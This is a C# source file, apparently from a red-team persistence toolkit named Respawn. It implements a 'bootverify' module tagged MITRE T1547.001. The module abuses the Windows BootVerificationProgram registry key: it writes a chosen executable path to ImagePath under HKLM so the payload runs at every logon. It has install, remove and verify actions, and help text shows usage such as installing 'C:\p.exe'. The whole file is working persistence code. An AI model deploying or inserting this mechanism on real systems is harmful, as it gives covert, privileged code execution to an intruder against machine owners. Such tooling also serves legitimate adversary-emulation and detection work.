using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.BootVerify
{
    public class BootVerifyModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "bootverify";
        public string Name        => "Boot Verification Program";
        public string Mitre       => "T1547.001";
        public string Description => "Abuse the Windows Boot Verification feature. By defining a custom BootVerificationProgram, the payload is executed by the system once a user logs on to verify the boot status.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"SYSTEM\CurrentControlSet\Control\BootVerificationProgram";
        const string ValueName = "ImagePath";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Full path to the executable payload");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t bootverify -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t bootverify -a install -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t bootverify -a verify");
            TechniqueHelpBuilder.RenderExample("Respawn -t bootverify -a remove");
        }

        public List<TechniqueOption> ListOptions(string type) => 
            type.Equals("keys", StringComparison.OrdinalIgnoreCase) ? BootVerifyKeys.All : new List<TechniqueOption>();

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (string.IsNullOrEmpty(ctx.Payload)) return TechniqueResult.Fail("Payload path required (-p).");

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true) 
                                  ?? Microsoft.Win32.Registry.LocalMachine.CreateSubKey(RegPath, writable: true);

                if (baseKey == null) return TechniqueResult.Denied("Access denied to BootVerification registry. Run as Admin.");

                if (baseKey.GetValue(ValueName) != null)
                    return TechniqueResult.Exists("A BootVerificationProgram is already registered.");

                baseKey.SetValue(ValueName, ctx.Payload);

                return TechniqueResult.Ok($"Installed Boot Verification Program -> '{ctx.Payload}'. Will trigger on next logon.");
            }
            catch (Exception ex) { return TechniqueResult.Fail(ex.Message); }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null || baseKey.GetValue(ValueName) == null) 
                    return TechniqueResult.NotFound("No BootVerificationProgram found.");

                baseKey.DeleteValue(ValueName);
                return TechniqueResult.Ok("Removed Boot Verification Program.");
            }
            catch (Exception ex) { return TechniqueResult.Fail(ex.Message); }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                string? path = baseKey?.GetValue(ValueName) as string;

                if (string.IsNullOrEmpty(path))
                    return TechniqueResult.NotFound("Boot Verification Program is not set.");

                return TechniqueResult.Ok($"Active BootVerificationProgram: '{path}'");
            }
            catch (Exception ex) { return TechniqueResult.Fail(ex.Message); }
        }

        private bool Validate(ExecutionContext ctx, bool req, out string err) { err = ""; return true; }
    }
}